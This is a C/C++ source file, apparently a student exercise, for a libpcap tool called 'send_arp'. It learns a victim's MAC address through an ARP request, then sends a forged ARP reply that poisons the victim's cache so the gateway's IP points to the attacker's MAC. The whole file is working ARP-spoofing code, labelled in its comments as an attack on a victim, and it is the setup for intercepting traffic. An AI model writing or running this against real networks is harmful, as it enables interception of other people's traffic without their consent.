#pragma once
#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>

using namespace std;

typedef struct
{
    struct ethhdr eth_hdr;
    struct ether_arp arp_hdr;
} arp_packet;

void usage()
{
    printf("send_arp <interface> <sender ip> <target ip>\n");
    printf("ex : send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

void convertedIP(uint8_t* IP, char* argv)
{
    char* ipstring = strdup(argv);
    char* p = strtok(ipstring, ".");
    int i = 0;
    while(p != NULL)
    {
        IP[i] = strtoul(p, nullptr, 10);
        p = strtok(NULL, ".");
        i++;
    }
}

void attackerDATA(uint8_t* attackermac, char* dev)
{
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s))
    {
        int i;
        for (i = 0; i < 6; ++i)
        {
            attackermac[i] = static_cast<uint8_t>(s.ifr_addr.sa_data[i]);
        }
        printf("\n");
    }

}

void senderMAC(pcap_t* fp, uint8_t* attacker_MAC, uint8_t* sender_IP, uint8_t* sender_mac)
{
    arp_packet arp_req_packet;
    //Ethernet header
    for (int i=0; i < 6; i++)
    {
        arp_req_packet.eth_hdr.h_dest[i] = 0xff;   //set broadcast MAC
        arp_req_packet.eth_hdr.h_source[i] = attacker_MAC[i];    //set source MAC
    }
    arp_req_packet.eth_hdr.h_proto = htons(ETH_P_ARP);

    //ARP header
    arp_req_packet.arp_hdr.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_req_packet.arp_hdr.ea_hdr.ar_pro = htons(0x0800);
    arp_req_packet.arp_hdr.ea_hdr.ar_hln = 0x06;
    arp_req_packet.arp_hdr.ea_hdr.ar_pln = 0x04;
    arp_req_packet.arp_hdr.ea_hdr.ar_op = htons(ARPOP_REQUEST);
    for (int i = 0; i < 6; i++)
    {
        arp_req_packet.arp_hdr.arp_sha[i] = attacker_MAC[i];
        arp_req_packet.arp_hdr.arp_tha[i] = 0x00;
    }
    for (int i = 0; i < 4; i++)
    {
        arp_req_packet.arp_hdr.arp_spa[i] = 0x00;
        arp_req_packet.arp_hdr.arp_tpa[i] = sender_IP[i];
    }

    //send
    u_char arp_to_send[42];
    memcpy(arp_to_send, &arp_req_packet, sizeof(arp_packet));
    if((pcap_sendpacket(fp, arp_to_send, sizeof(arp_req_packet))) != 0)
    {
        fprintf(stderr, "\nSending ARP_Request Failed");
        return;
    }
    else
    {
        while (true)    //capturing
        {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(fp, &header, &packet);
            if (res == 0)
                continue;
            if (res == -1 || res == -2)
                break;
            arp_packet* arp_rep_packet = reinterpret_cast<arp_packet*>(const_cast<u_char*>(packet));

            for (int i = 0; i < 4; i++)                 //checking part1 (IP address)
            {
                if(arp_req_packet.arp_hdr.arp_tpa[i] != arp_rep_packet->arp_hdr.arp_spa[i])
                {
                    break;
                }
            }
            if (ntohs(arp_rep_packet->eth_hdr.h_proto) == ETH_P_ARP)// checking part2 (ethernet protocol type)
            {
                for (int i = 0; i < 6; i++)
                {
                    sender_mac[i] = arp_rep_packet->arp_hdr.arp_sha[i];
                }
                return;
            }
        }
    }
}

void arpspoofing(pcap_t* fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t* attacker_MAC, uint8_t* target_IP)
{
    arp_packet spoofingData;

    //ethernet header field
    for (int i = 0; i < 6; i++)
    {
        spoofingData.eth_hdr.h_dest[i] = sender_MAC[i];
        spoofingData.eth_hdr.h_source[i] = attacker_MAC[i];
    }
    spoofingData.eth_hdr.h_proto = htons(ETH_P_ARP);

    //arp header field
    spoofingData.arp_hdr.ea_hdr.ar_op = htons(ARPOP_REPLY);
    spoofingData.arp_hdr.ea_hdr.ar_hln = 0x06;
    spoofingData.arp_hdr.ea_hdr.ar_pln = 0x04;
    spoofingData.arp_hdr.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    spoofingData.arp_hdr.ea_hdr.ar_pro = htons(0x0800);

    for (int i = 0 ; i < 6; i++)
    {
        spoofingData.arp_hdr.arp_sha[i] = attacker_MAC[i];
        spoofingData.arp_hdr.arp_tha[i] = sender_MAC[i];
    }

    for (int i = 0; i < 4; i++)
    {
        spoofingData.arp_hdr.arp_spa[i] = target_IP[i];
        spoofingData.arp_hdr.arp_tpa[i] = sender_IP[i];
    }

    //casting
    u_char arp_to_send[42];
    memcpy(arp_to_send, &spoofingData, sizeof(spoofingData));

    //send attack packet
    if((pcap_sendpacket(fp, arp_to_send, sizeof(arp_to_send))) != 0)
    {
        fprintf(stderr, "\nARP_Request : Fail~!!\n");
    }
}

int main(int argc, char** argv)
{
    if (argc != 4)      //count argument
    {
        usage();
        return -1;
    }

    uint8_t sender_ip[4];   //sender ip == victim
    convertedIP(sender_ip, argv[2]);
    uint8_t target_ip[4];   //target ip == gateway
    convertedIP(target_ip, argv[3]);

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
      return -1;
    }

    uint8_t attacker_mac[6];
    attackerDATA(attacker_mac, dev);

    uint8_t sender_mac[6];
    senderMAC(handle, attacker_mac, sender_ip, sender_mac);

    arpspoofing(handle, sender_mac, sender_ip, attacker_mac, target_ip);
    return 0;
}
